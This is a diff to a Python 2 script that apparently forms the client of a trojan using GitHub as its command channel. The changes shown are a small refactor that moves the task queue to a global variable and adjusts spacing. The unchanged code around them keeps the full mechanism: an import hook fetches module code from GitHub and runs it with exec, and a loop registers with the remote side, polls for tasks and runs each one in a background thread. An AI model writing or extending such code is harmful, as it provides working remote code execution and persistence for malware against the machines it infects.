@@ -36,10 +36,9 @@ class Config:
 		#seed to generate ids, also used as sleep key
 		self.id_s = "id_slp"
 		self.imp = "import %s"
-		self.size = "200" #block size of cipher
+		self.size = "200" #less than block size of cipher
 		self.size = int(self.fixstr(self.size))
 		self.sleep = int(self.fixstr(self.sleep))
-		self.tasks = Queue.Queue() #task queue
 		self.u_id() #generate a new id on start
 		self.u_pk(self.pk) #import public key into cipher object
 		random.seed()
@@ -193,14 +192,14 @@ class ReImp(object):
 	def __init__(self):
 		self.code = ""
 
-	def find_module(self, fullname, path=None): #get file from github
+	def find_module(self, fullname, path = None): #get file from github
 		lib = get_file(config.g_mod() + fullname)
 		if lib is not None:
 			self.code = lib
 			return self
 		return None
 
-	def load_module(self,name): #load file into new module
+	def load_module(self, name): #load file into new module
 		module = imp.new_module(name)
 		exec self.code in module.__dict__
 		sys.modules[name] = module
@@ -308,9 +307,10 @@ def run_module(**task):
 
 #runs all queued modules in new threads
 def module_runner():
-	while not config.tasks.empty():
-		task = config.tasks.get()
-		t = threading.Thread(target=run_module, kwargs = task)
+	global tasks
+	while not tasks.empty():
+		task = tasks.get()
+		t = threading.Thread(target = run_module, kwargs = task)
 		t.daemon = True
 		t.start()
 		try:
@@ -322,6 +322,7 @@ def module_runner():
 #main
 config = Config() #create config object
 sys.meta_path = [ReImp()] #add remote import to the import path
+tasks = Queue.Queue() #task queue
 while True: #keep trying to create config file until successful
 	try:
 		create_config() #create a blank config file to register
@@ -329,14 +330,14 @@ while True: #keep trying to create config file until successful
 	except:
 		time.sleep(config.g_sleep())
 while True: #keep checking for and running new tasks
-	if config.tasks.empty(): #get config file when all tasks have been finished
+	if tasks.empty(): #get config file when all tasks have been finished
 		config_file = get_config()
 		if config_file == None:
 			time.sleep(config.g_sleep()) #sleep if there are no new tasks
 			continue
 		for task in config_file:
-			config.tasks.put(task) #if there are tasks add them to the queue
-	if not config.tasks.empty(): #run tasks in queue and then clear config file
+			tasks.put(task) #if there are tasks add them to the queue
+	if not tasks.empty(): #run tasks in queue and then clear config file
 		module_runner()
 		while True: #keep trying otherwise well keep running same modules
 			try:
